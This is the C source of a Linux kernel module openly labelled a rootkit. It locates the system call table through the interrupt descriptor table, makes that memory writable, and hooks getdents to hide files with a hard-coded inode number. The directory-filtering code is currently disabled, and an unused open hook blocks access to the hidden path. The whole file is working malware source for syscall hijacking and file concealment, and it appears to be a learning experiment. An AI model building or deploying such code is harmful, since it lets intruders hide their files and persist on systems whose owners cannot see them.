/**
 * rootkit
 * */


#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/path.h>

#include <asm/syscall.h>

#include <asm/pgtable.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("firejox");
MODULE_DESCRIPTION("hook open and getdents");

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];

};

typedef void (*handle_t) (void);

handle_t *syscall_table = NULL;

static unsigned long hide_inode = 3675405;

typedef asmlinkage int (*handle_getdents) (
        unsigned int fd,
        struct linux_dirent __user *dirp,
        unsigned int count);

static handle_getdents real_getdents = NULL;

typedef asmlinkage int (*handle_open) (
        const char __user *pathname,
        int flags);

static handle_open real_open = NULL;


static unsigned int level;
static pte_t *pte;


asmlinkage int hook_getdents(
        unsigned int fd,
        struct linux_dirent __user *dirp,
        unsigned int count) {

    int ret = real_getdents(fd, dirp, count);
    struct linux_dirent *cur = NULL, *prev = NULL;
    char *p = (char*)(void*)dirp;
    int bpos = 0;

    printk ("Hook succeed!\n");

#if 0
    if (ret > 0) {
        while (bpos < ret) {
            prev = cur;
            cur = (struct linux_dirent*)(p + bpos);
            bpos += cur->d_reclen;

            if (prev != NULL && cur->d_ino == hide_inode) {
                prev->d_reclen += cur->d_reclen;
                cur = prev;
            }       
        }
    }
#endif
    return ret;
}

asmlinkage int hook_open (
        const char __user *pathname,
        int flags) {
    struct inode *node;
    struct dentry *entry = NULL;
    struct path p;

    kern_path (pathname, LOOKUP_FOLLOW, &p);
    entry = p.dentry;
    
    while (entry != NULL) {
        if (entry->d_inode->i_ino == hide_inode)
            return -1;
        entry = entry->d_parent;
    }

    return real_open (pathname, flags);
}


static int rootkit_init(void) {
    struct desc_ptr idt;
    gate_desc *sys_gate;
    unsigned char *syscall_ptr;
    int i;
    
    printk("load rootkit module");

    asm ("sidt %0" : "=m" (idt));

    printk ("IDT address : %#lx\n" , idt.address);

    sys_gate =  ((gate_desc*)(idt.address + 0x80*16));


    syscall_ptr = (unsigned char*)(gate_offset(*sys_gate));

    printk ("syscall address : %#lx\n", syscall_ptr);

    //printk ("table address: %#x\n", sys_call_table);

    for (i = 0; i < 128; i+=8) { 
        printk("%02x %02x %02x %02x %02x %02x %02x %02x\n", 
                syscall_ptr[i], syscall_ptr[i+1], syscall_ptr[i+2], 
                syscall_ptr[i+3], syscall_ptr[i+4], syscall_ptr[i+5], 
                syscall_ptr[i+6], syscall_ptr[i+7]);
    }
    

    for (i = 0; i < 128; i++) {
        if (syscall_ptr[i] == 0xff && 
                syscall_ptr[i+1] == 0x14 &&
                syscall_ptr[i+2] == 0xc5) {
            unsigned long tmp = *(unsigned long*)(syscall_ptr + i + 3);
            tmp = (tmp & 0x00000000ffffffff) | 0xffffffff00000000;

            syscall_table = *(handle_t**)tmp;
            break;
        }
    }

    if (syscall_table == NULL) {
        printk ("fail to find system call table!!\n");
        return 0;
    }

    printk ("syscall table address : %#lx\n", syscall_table);
    real_getdents = syscall_table[__NR_getdents];
    real_open = syscall_table[__NR_open];

    printk ("open address : %#lx\n", real_open);
    printk ("getdents address: %#lx\n", real_getdents);

    pte = lookup_address ((unsigned long) syscall_table, &level);

    printk ("pte level : %d\n", level);

    set_pte_atomic (pte, pte_mkwrite(*pte));
#if 1
    
    syscall_table[__NR_getdents] = (handle_t)hook_getdents;

#endif
    set_pte_atomic (pte, pte_wrprotect(*pte));

    printk ("getdents hook!!\n");
    return 0;    
}


static void rootkit_exit (void) {

    set_pte_atomic (pte, pte_mkwrite(*pte));

    if (real_getdents) 
        syscall_table[__NR_getdents] = (handle_t) real_getdents;

    set_pte_atomic (pte, pte_wrprotect(*pte));

    printk ("Unload rootkit module!!\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);

